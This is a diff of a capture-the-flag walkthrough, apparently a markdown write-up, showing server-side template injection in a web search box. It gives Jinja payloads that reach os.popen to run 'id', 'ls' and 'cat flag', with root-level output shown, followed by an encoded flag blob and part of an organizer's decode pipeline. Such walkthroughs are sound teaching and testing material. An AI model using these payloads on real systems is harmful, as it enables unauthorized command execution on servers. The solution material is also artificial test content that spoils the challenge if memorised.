@@ -16,29 +16,31 @@
 
 + 1.In the search box the player first submits:
 ```{{7*7}}```
-	This will render and show 49.
++ This will render and show 49.
 
 + 2.Next they try to gather system information using SSTI:
 
 ```{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}```
 
-	This will show something like:
++ This will show something like:
 ```uid=0(root) gid=0(root) groups=0(root)```
 
 + 3.Then they list files in the current directory:
 
 ```{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}```
 
-	This will show entries including flag (and other files).
++ This will show entries including flag (and other files).
 
 + 4.Finally they read the flag file with:
+
 ```
-{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}```
+{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
+```
 
 + The application will return the encoded blob (exact output below):
+
 ```
 %31%30%30%31%30%31%30%31%30%31%30%31%31%30%30%30%31%31%30%31%30%31%31%30%31%30%31%31%31%30%31%31%30%31%31%30%30%31%31%30%31%30%31%61%31%31%30%30%31%31%30%30%30%31%30%30%30%31%30%30%31%31%31%30%31%31%31%31%31%30%30%30%31%31%30%31%31%31%31%31%31%31%30%31%30%30%30%31%31%31%31%31%30%30%31%30%31%31%30%30%31%31%31%30%30%31%31%31%31%30%30%31%30%31%31%30%31%31%31%31%31%31%31%30%31%31%30%66%31%30%31%61%31%30%30%31%31%31%30%30%31%30%30%30%31%30%30%31%30%30%30%30%30%31%30%31%30%30%30%31%30%30%31%30%30%30%31%31%30%30%30%30%30%31%31%31%31%31%31%31%30%31%30%31%30%31%30%30%30%31%30%31%30%31%31%31%31%31%30%31%31%31%30%31%30%31%30%31%31%31%30%30%31%30%30%64%31%30%31%31%31%30%31%31%30%31%31%30%31%31%30%31%30%30%31%31%31%31%30%31%31%30%31%30%30%65%31%30%31%31%30%31%31%30%31%30%31%31%30%30%30%30%30%30%30%31%30%31%30%31%31%31%30%30%30%30%62%31%30%31%30%31%30%31%30%31%30%30%31%31%30%30%31%64%31%31%64```
-
 ---
 
 ### Decode pipeline (organizer helper)
@@ -53,4 +55,4 @@ To retrieve the final CTF_flag{...}, apply the following transforms in order to 
 
 + 4.Base64-decode the resulting bytes to obtain the final CTF_flag{...} text.
 
-![Step 1](images/1.png)
+![Step 1](1.png)
